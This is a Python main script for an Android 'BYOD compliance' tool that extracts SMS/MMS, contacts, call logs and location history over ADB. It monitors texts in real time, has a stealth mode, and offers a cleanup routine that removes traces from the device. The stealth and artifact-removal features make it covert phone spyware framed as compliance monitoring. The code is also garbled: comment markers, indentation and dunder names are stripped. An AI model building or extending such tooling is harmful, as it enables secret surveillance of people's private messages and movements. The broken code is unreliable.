#!/usr/bin/env python3 
""" 
BYOD Compliance Monitoring Tool - Unified Entry Point

Complete enterprise-grade BYOD compliance monitoring proof-of-concept.

Coordinates all monitoring modules:
- SMS/MMS Extraction & Real-Time Monitoring
- Contact & Call Log Extraction
- Device Location Tracking with Geofencing
- Message Analysis & Thread Reconstruction
- Stealth Operation Mode
- Compliance Report Generation
- Data Cleanup & Artifact Removal

Usage: 
python main.py --full                    # Run complete extraction 
python main.py --sms-only                # Extract SMS only 
python main.py --monitor                 # Real-time monitoring mode 
python main.py --device SERIAL           # Target specific device 
python main.py --stealth                 # Enable stealth mode 
python main.py --output html             # HTML report output 
python main.py --cleanup                 # Remove all artifacts

Author: Built for a father who codes through the fog. 
"""

import argparse 
import json 
import logging 
import sys 
import os 
import time 
from pathlib import Path 
from datetime import datetime 
from typing import Optional, Dict, Any, List, Tuple

Import all modules
try: 
from src.adb_interface import ADBInterface 
from src.db_handler import ComplianceDatabase 
from src.sms_extractor import SMSExtractor 
from src.sms_monitor import RealtimeSMSMonitor 
from src.contact_extractor import ContactExtractor 
from src.call_log_extractor import CallLogExtractor 
from src.location_tracker import LocationTracker 
from src.message_analyzer import MessageAnalyzer 
from src.stealth_manager import StealthAgent 
from src.compliance_engine import ComplianceEngine 
from src.report_generator import ComplianceReporter 
from src.cleanup_manager import CleanupManager 
except ImportError as e: 
print(f"Error importing required modules: {e}") 
print("Please ensure all dependencies are installed and paths are correct.") 
sys.exit(1)

Configure logging
def setup_logging(verbose: bool = False) -> None: 
"""Configure logging with proper handlers and formatting.""" 
log_dir = Path("logs") 
log_dir.mkdir(parents=True, exist_ok=True)

log_level = logging.DEBUG if verbose else logging.INFO

# Create formatters
file_formatter = logging.Formatter(
    '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
console_formatter = logging.Formatter(
    '%(asctime)s - %(levelname)s - %(message)s'
)

# Create handlers
file_handler = logging.FileHandler(log_dir / 'byod_monitor.log')
file_handler.setLevel(log_level)
file_handler.setFormatter(file_formatter)

console_handler = logging.StreamHandler(sys.stdout)
console_handler.setLevel(log_level)
console_handler.setFormatter(console_formatter)

# Configure root logger
root_logger = logging.getLogger()
root_logger.setLevel(log_level)

# Remove existing handlers
root_logger.handlers.clear()

# Add new handlers
root_logger.addHandler(file_handler)
root_logger.addHandler(console_handler)
logger = logging.getLogger(name)


class BYODComplianceMonitor: 
""" 
Master coordinator for all BYOD compliance monitoring operations.

This class initializes all modules, manages the device connection,
orchestrates extraction operations, and generates final reports.

Think of this as the conductor of an orchestra—each module is an
instrument, and this class ensures they all play in harmony.
"""

def __init__(
    self,
    device_serial: Optional[str] = None,
    config_path: str = "config/policy_config.json",
    output_dir: str = "output",
    stealth_mode: bool = False
):
    """
    Initialize the BYOD Compliance Monitor.
    
    Args:
        device_serial: Target device serial number (None = auto-detect)
        config_path: Path to policy configuration JSON
        output_dir: Directory for reports and extracted data
        stealth_mode: Enable stealth operation
        
    Raises:
        RuntimeError: If device connection fails
        FileNotFoundError: If config file is invalid
    """
    logger.info("=" * 60)
    logger.info("BYOD Compliance Monitoring Tool - Initializing")
    logger.info("=" * 60)
    
    # Load configuration
    self.config = self._load_config(config_path)
    
    # Setup directories
    self.output_dir = Path(output_dir)
    self.output_dir.mkdir(parents=True, exist_ok=True)
    self.temp_dir = Path("temp_data")
    self.temp_dir.mkdir(parents=True, exist_ok=True)
    
    # Initialize device connection
    logger.info("Connecting to Android device...")
    try:
        self.adb = ADBInterface(
            device_serial=device_serial,
            timeout=self.config.get("adb_timeout", 30)
        )
        self.device_info = self.adb.get_device_info()
        
        if not self.device_info:
            raise RuntimeError("Failed to retrieve device information")
            
        logger.info(f"Connected to: {self.device_info.get('model', 'Unknown')} "
                   f"(Android {self.device_info.get('android_version', 'Unknown')})")
    except Exception as e:
        logger.error(f"Failed to connect to device: {e}")
        raise RuntimeError(f"Device connection failed: {e}")
    
    # Initialize database
    try:
        self.db = ComplianceDatabase()
        self.db.connect()
        self.db.initialize_tables()
    except Exception as e:
        logger.error(f"Failed to initialize database: {e}")
        raise RuntimeError(f"Database initialization failed: {e}")
    
    # Register device in inventory
    self.device_id = self.adb.device_serial
    if not self.device_id:
        raise RuntimeError("Device serial number is empty")
        
    try:
        self.db.register_device(
            device_id=self.device_id,
            device_model=self.device_info.get("model", "Unknown"),
            android_version=self.device_info.get("android_version"),
            owner_type="corporate"
        )
    except Exception as e:
        logger.warning(f"Failed to register device: {e}")
    
    # Initialize all modules
    try:
        self.stealth = StealthAgent(self.adb) if stealth_mode else None
        self.sms_extractor = SMSExtractor(self.adb, working_dir=str(self.temp_dir))
        self.sms_monitor = RealtimeSMSMonitor(self.adb, self.config)
        self.contact_extractor = ContactExtractor(self.adb, working_dir=str(self.temp_dir))
        self.call_extractor = CallLogExtractor(self.adb, working_dir=str(self.temp_dir))
        self.location_tracker = LocationTracker(self.adb, self.config)
        self.message_analyzer = MessageAnalyzer()
        self.compliance_engine = ComplianceEngine(self.config, self.db)
        self.reporter = ComplianceReporter(output_dir=str(self.output_dir))
        self.cleanup = CleanupManager(self.adb, self.temp_dir)
    except Exception as e:
        logger.error(f"Failed to initialize modules: {e}")
        raise RuntimeError(f"Module initialization failed: {e}")
    
    # Storage for extracted data
    self.extracted_data = {
        "sms_messages": [],
        "sms_threads": [],
        "contacts": [],
        "call_logs": [],
        "locations": [],
        "violations": [],
        "analysis": {},
        "metadata": {
            "extraction_timestamp": datetime.now().isoformat(),
            "device_serial": self.device_id,
            "device_model": self.device_info.get("model"),
            "android_version": self.device_info.get("android_version"),
            "tool_version": "1.0.0"
        }
    }
    
    logger.info("All modules initialized successfully")

def _load_config(self, config_path: str) -> Dict[str, Any]:
    """
    Load policy configuration from JSON file.
    
    Args:
        config_path: Path to configuration file
        
    Returns:
        Configuration dictionary
    """
    try:
        config_file = Path(config_path)
        if not config_file.exists():
            logger.warning(f"Config file not found: {config_path}")
            return self._default_config()
            
        if not config_file.is_file():
            logger.warning(f"Invalid config path (not a file): {config_path}")
            return self._default_config()
        
        with open(config_file, 'r', encoding='utf-8') as f:
            config = json.load(f)
            
        if not isinstance(config, dict):
            logger.warning("Config file does not contain a valid JSON object")
            return self._default_config()
            
        logger.info(f"Configuration loaded from {config_path}")
        return config
        
    except json.JSONDecodeError as e:
        logger.error(f"Invalid JSON in config file: {e}")
        return self._default_config()
    except IOError as e:
        logger.error(f"Error reading config file: {e}")
        return self._default_config()
    except Exception as e:
        logger.error(f"Unexpected error loading config: {e}")
        return self._default_config()

def _default_config(self) -> Dict[str, Any]:
    """Return default configuration if config file is missing or invalid."""
    return {
        "sms_policy": {
            "monitor_inbound": True,
            "monitor_outbound": True,
            "forbidden_keywords": ["classified", "confidential", "proprietary"],
            "log_all_messages": True
        },
        "contact_policy": {
            "max_personal_contacts": 50,
            "forbidden_domains": ["competitor.com"]
        },
        "location_policy": {
            "track_during_business_hours": True,
            "store_history_days": 30,
            "location_sample_interval_seconds": 300
        },
        "stealth": {"enabled": False},
        "reporting": {"output_format": "json", "generate_html_report": True},
        "adb_timeout": 30
    }

def run_full_extraction(self) -> Dict[str, Any]:
    """
    Execute complete extraction pipeline.
    
    This runs ALL extraction modules in sequence:
    1. Enable stealth mode (if configured)
    2. Extract SMS/MMS messages
    3. Extract contacts
    4. Extract call logs
    5. Extract location history
    6. Analyze all extracted data
    7. Run compliance checks
    8. Generate reports
    9. Clean up temporary files
    
    Returns:
        Complete extracted data dictionary
    """
    logger.info("=" * 60)
    logger.info("STARTING FULL EXTRACTION PIPELINE")
    logger.info("=" * 60)
    
    start_time = time.time()
    
    try:
        # Step 0: Enable stealth mode if configured
        if self.stealth:
            logger.info("[STEALTH] Activating stealth mode...")
            self.stealth.enable_stealth_mode()
        
        # Step 1: Extract SMS/MMS messages
        logger.info("\n[1/7] Extracting SMS/MMS messages...")
        try:
            sms_messages, sms_threads = self.sms_extractor.extract_all()
            self.extracted_data["sms_messages"] = sms_messages
            self.extracted_data["sms_threads"] = sms_threads
            logger.info(f"  ✓ Extracted {len(sms_messages)} messages in {len(sms_threads)} threads")
            
            # Log to database
            self._safe_db_log(
                device_id=self.device_id,
                event_type="sms_extraction",
                severity="info",
                policy_reference="sms_policy.log_all_messages",
                details={"messages_extracted": len(sms_messages)}
            )
        except Exception as e:
            logger.error(f"  ✗ SMS extraction failed: {e}", exc_info=True)
            self.extracted_data["sms_messages"] = []
            self.extracted_data["sms_threads"] = []
        
        # Step 2: Extract contacts
        logger.info("\n[2/7] Extracting contacts...")
        try:
            contacts = self.contact_extractor.extract_all()
            self.extracted_data["contacts"] = contacts
            logger.info(f"  ✓ Extracted {len(contacts)} contacts")
        except Exception as e:
            logger.error(f"  ✗ Contact extraction failed: {e}", exc_info=True)
            self.extracted_data["contacts"] = []
        
        # Step 3: Extract call logs
        logger.info("\n[3/7] Extracting call logs...")
        try:
            call_logs = self.call_extractor.extract_all()
            self.extracted_data["call_logs"] = call_logs
            logger.info(f"  ✓ Extracted {len(call_logs)} call records")
        except Exception as e:
            logger.error(f"  ✗ Call log extraction failed: {e}", exc_info=True)
            self.extracted_data["call_logs"] = []
        
        # Step 4: Extract location history
        logger.info("\n[4/7] Extracting location data...")
        try:
            locations = self.location_tracker.extract_location_history()
            self.extracted_data["locations"] = locations
            logger.info(f"  ✓ Extracted {len(locations)} location points")
        except Exception as e:
            logger.error(f"  ✗ Location extraction failed: {e}", exc_info=True)
            self.extracted_data["locations"] = []
        
        # Step 5: Analyze all extracted data
        logger.info("\n[5/7] Analyzing extracted data...")
        try:
            analysis_results = self.message_analyzer.analyze_all(
                messages=self.extracted_data["sms_messages"],
                contacts=self.extracted_data["contacts"],
                call_logs=self.extracted_data["call_logs"]
            )
            self.extracted_data["analysis"] = analysis_results
            logger.info(f"  ✓ Analysis complete: {analysis_results.get('summary', {})}")
        except Exception as e:
            logger.error(f"  ✗ Analysis failed: {e}", exc_info=True)
            self.extracted_data["analysis"] = {"error": str(e)}
        
        # Step 6: Run compliance checks
        logger.info("\n[6/7] Running compliance checks...")
        try:
            violations = self.compliance_engine.evaluate_all(
                sms_messages=self.extracted_data["sms_messages"],
                contacts=self.extracted_data["contacts"],
                call_logs=self.extracted_data["call_logs"],
                locations=self.extracted_data["locations"],
                device_info=self.device_info
            )
            self.extracted_data["violations"] = violations
            logger.info(f"  ✓ Found {len(violations)} policy violations")
            
            # Log each violation to database
            for violation in violations:
                self._safe_db_log(
                    device_id=self.device_id,
                    event_type=violation.get("type", "unknown"),
                    severity=violation.get("severity", "warning"),
                    policy_reference=violation.get("policy_ref", ""),
                    details=violation
                )
        except Exception as e:
            logger.error(f"  ✗ Compliance check failed: {e}", exc_info=True)
            self.extracted_data["violations"] = []
        
        # Step 7: Generate reports
        logger.info("\n[7/7] Generating compliance reports...")
        report_paths = {}
        try:
            report_paths = self.reporter.generate_all_reports(self.extracted_data)
            logger.info(f"  ✓ Reports generated:")
            for report_type, path in report_paths.items():
                if path:
                    logger.info(f"    - {report_type}: {path}")
        except Exception as e:
            logger.error(f"  ✗ Report generation failed: {e}", exc_info=True)
        
        # Calculate elapsed time
        elapsed = time.time() - start_time
        logger.info("\n" + "=" * 60)
        logger.info(f"EXTRACTION COMPLETE in {elapsed:.1f} seconds")
        logger.info("=" * 60)
        
        return self.extracted_data
        
    except Exception as e:
        logger.error(f"Extraction pipeline failed: {e}", exc_info=True)
        raise
        
    finally:
        # Clean up stealth mode
        if self.stealth:
            try:
                self.stealth.disable_stealth_mode()
            except Exception as e:
                logger.warning(f"Failed to disable stealth mode: {e}")

def _safe_db_log(self, **kwargs) -> None:
    """Safely log to database without raising exceptions."""
    try:
        self.db.log_compliance_event(**kwargs)
    except Exception as e:
        logger.warning(f"Failed to log to database: {e}")

def run_sms_only(self) -> Dict[str, Any]:
    """Extract SMS/MMS messages only."""
    logger.info("Running SMS-only extraction...")
    
    try:
        sms_messages, sms_threads = self.sms_extractor.extract_all()
        self.extracted_data["sms_messages"] = sms_messages
        self.extracted_data["sms_threads"] = sms_threads
        
        # Export to JSON
        self.sms_extractor.export_to_json(
            sms_messages, sms_threads,
            str(self.output_dir / "sms_export.json")
        )
        
        return self.extracted_data
        
    except Exception as e:
        logger.error(f"SMS-only extraction failed: {e}")
        raise

def run_contacts_only(self) -> Dict[str, Any]:
    """Extract contacts only."""
    logger.info("Running contacts-only extraction...")
    
    try:
        contacts = self.contact_extractor.extract_all()
        self.extracted_data["contacts"] = contacts
        
        return self.extracted_data
        
    except Exception as e:
        logger.error(f"Contacts-only extraction failed: {e}")
        raise

def run_realtime_monitoring(self, duration_minutes: int = 30) -> None:
    """
    Run real-time SMS monitoring.
    
    Args:
        duration_minutes: How long to monitor (default: 30 minutes)
        
    Raises:
        ValueError: If duration_minutes is invalid
    """
    if duration_minutes <= 0:
        raise ValueError("Duration must be a positive integer")
    
    logger.info(f"Starting real-time monitoring for {duration_minutes} minutes...")
    
    try:
        self.sms_monitor.start_monitoring(
            duration_seconds=duration_minutes * 60,
            callback=self._on_sms_detected
        )
    except KeyboardInterrupt:
        logger.info("Monitoring stopped by user")
        raise
    except Exception as e:
        logger.error(f"Real-time monitoring failed: {e}")
        raise

def _on_sms_detected(self, sms_data: Dict[str, Any]) -> None:
    """
    Callback for real-time SMS detection.
    
    Args:
        sms_data: Detected SMS message data
    """
    try:
        # Check for policy violations in real-time
        violations = self.compliance_engine.check_sms_compliance(sms_data)
        
        if violations:
            for violation in violations:
                logger.warning(f"⚠️ REAL-TIME VIOLATION: {violation.get('description')}")
                self._safe_db_log(
                    device_id=self.device_id,
                    event_type="realtime_sms_violation",
                    severity=violation.get("severity", "warning"),
                    policy_reference=violation.get("policy_ref", ""),
                    details={"sms": sms_data, "violation": violation}
                )
        else:
            logger.info(f"SMS OK: {sms_data.get('address')} - {sms_data.get('body', '')[:50]}")
            
    except Exception as e:
        logger.error(f"Error processing SMS callback: {e}")

def generate_report(self, report_format: str = "html") -> str:
    """
    Generate compliance report from extracted data.
    
    Args:
        report_format: 'html' or 'json' or 'text'
        
    Returns:
        Path to generated report
        
    Raises:
        ValueError: If report format is invalid
    """
    if report_format not in ["html", "json", "text"]:
        raise ValueError(f"Invalid report format: {report_format}")
    
    try:
        if report_format == "html":
            return self.reporter.generate_html_report(self.extracted_data)
        elif report_format == "json":
            return self.reporter.generate_json_report(self.extracted_data)
        else:
            return self.reporter.generate_text_report(self.extracted_data)
    except Exception as e:
        logger.error(f"Report generation failed: {e}")
        raise

def cleanup_all(self) -> None:
    """Remove all monitoring artifacts and temporary files."""
    logger.info("Running complete cleanup...")
    
    try:
        # Clean up device
        if self.cleanup:
            self.cleanup.clean_device_artifacts()
        
        # Clean up local temporary files
        if self.cleanup:
            self.cleanup.clean_local_temp_files()
        
    except Exception as e:
        logger.error(f"Cleanup failed: {e}")
    
    finally:
        # Close database
        try:
            if hasattr(self, 'db') and self.db:
                self.db.close()
        except Exception as e:
            logger.warning(f"Failed to close database: {e}")
    
    logger.info("Cleanup complete. All artifacts removed.")

def get_compliance_summary(self) -> Dict[str, Any]:
    """Get compliance summary for the device."""
    try:
        return self.db.get_device_compliance_summary(self.device_id)
    except Exception as e:
        logger.error(f"Failed to get compliance summary: {e}")
        return {"error": str(e)}

def __enter__(self):
    """Context manager entry."""
    return self

def __exit__(self, exc_type, exc_val, exc_tb):
    """Context manager exit with cleanup."""
    self.cleanup_all()
    return False
def parse_arguments() -> argparse.Namespace: 
"""Parse command-line arguments.""" 
parser = argparse.ArgumentParser( 
description="BYOD Compliance Monitoring Tool", 
formatter_class=argparse.RawDescriptionHelpFormatter, 
epilog=""" 
Examples: 
python main.py --full                    # Complete extraction 
python main.py --sms-only                # SMS extraction only 
python main.py --monitor --duration 60   # Monitor for 60 minutes 
python main.py --device 123ABC --full    # Target specific device 
python main.py --stealth --full          # Full extraction in stealth mode 
python main.py --output html             # Generate HTML report 
python main.py --cleanup                 # Remove all artifacts 
""" 
)

# Operation mode arguments
parser.add_argument(
    "--full", action="store_true",
    help="Run complete extraction pipeline"
)
parser.add_argument(
    "--sms-only", action="store_true",
    help="Extract SMS/MMS messages only"
)
parser.add_argument(
    "--contacts-only", action="store_true",
    help="Extract contacts only"
)
parser.add_argument(
    "--monitor", action="store_true",
    help="Start real-time SMS monitoring"
)

# Configuration arguments
parser.add_argument(
    "--device", type=str, default=None,
    help="Target device serial number"
)
parser.add_argument(
    "--config", type=str, default="config/policy_config.json",
    help="Path to policy configuration file"
)
parser.add_argument(
    "--output", type=str, default="output",
    help="Output directory for reports"
)
parser.add_argument(
    "--duration", type=int, default=30,
    help="Monitoring duration in minutes (default: 30)"
)
parser.add_argument(
    "--stealth", action="store_true",
    help="Enable stealth operation mode"
)
parser.add_argument(
    "--report-format", type=str, default="html",
    choices=["html", "json", "text"],
    help="Report output format (default: html)"
)

# Maintenance arguments
parser.add_argument(
    "--cleanup", action="store_true",
    help="Remove all monitoring artifacts"
)
parser.add_argument(
    "--verbose", action="store_true",
    help="Enable verbose logging"
)

return parser.parse_args()
def main() -> None: 
"""Main entry point.""" 
args = parse_arguments()

# Setup logging
setup_logging(verbose=args.verbose)

logger.info("BYOD Compliance Monitoring Tool v1.0.0")
logger.info(f"Started at: {datetime.now().isoformat()}")

monitor = None
exit_code = 0

try:
    # Initialize monitor (unless just cleaning up)
    if not args.cleanup:
        monitor = BYODComplianceMonitor(
            device_serial=args.device,
            config_path=args.config,
            output_dir=args.output,
            stealth_mode=args.stealth
        )
    
    # Execute requested operation
    if args.full:
        # Complete extraction pipeline
        data = monitor.run_full_extraction()
        report_path = monitor.generate_report(args.report_format)
        print(f"\n✅ Full extraction complete!")
        print(f"   Report: {report_path}")
        print(f"   Messages: {len(data.get('sms_messages', []))}")
        print(f"   Contacts: {len(data.get('contacts', []))}")
        print(f"   Call logs: {len(data.get('call_logs', []))}")
        print(f"   Locations: {len(data.get('locations', []))}")
        print(f"   Violations: {len(data.get('violations', []))}")
        
    elif args.sms_only:
        data = monitor.run_sms_only()
        print(f"\n✅ SMS extraction complete!")
        print(f"   Messages: {len(data.get('sms_messages', []))}")
        print(f"   Threads: {len(data.get('sms_threads', []))}")
        
    elif args.contacts_only:
        data = monitor.run_contacts_only()
        print(f"\n✅ Contact extraction complete!")
        print(f"   Contacts: {len(data.get('contacts', []))}")
        
    elif args.monitor:
        print(f"\n🔍 Starting real-time SMS monitoring...")
        print(f"   Duration: {args.duration} minutes")
        print(f"   Press Ctrl+C to stop early\n")
        monitor.run_realtime_monitoring(duration_minutes=args.duration)
        
    elif args.cleanup:
        if monitor:
            monitor.cleanup_all()
        else:
            # Direct cleanup without full initialization
            cleanup = CleanupManager(None, Path("temp_data"))
            cleanup.clean_local_temp_files()
            print("\n✅ Cleanup complete!")
            
    else:
        print("\n⚠️ No operation specified. Use --full, --sms-only, --monitor, or --cleanup")
        print("   Run with --help for more information.")

except KeyboardInterrupt:
    logger.info("\n⚠️ Operation interrupted by user")
    print("\n⚠️ Operation interrupted. Cleaning up...")
    exit_code = 130
    
except Exception as e:
    logger.error(f"\n❌ Fatal error: {e}", exc_info=True)
    print(f"\n❌ Error: {e}")
    print("   Check logs/byod_monitor.log for details.")
    exit_code = 1
    
finally:
    if monitor:
        try:
            monitor.cleanup_all()
        except Exception as e:
            logger.warning(f"Final cleanup failed: {e}")
    
    logger.info(f"Finished at: {datetime.now().isoformat()}")
    print("\n📋 Session complete. Check output/ directory for reports.")
    sys.exit(exit_code)
if name == "main": 
main()
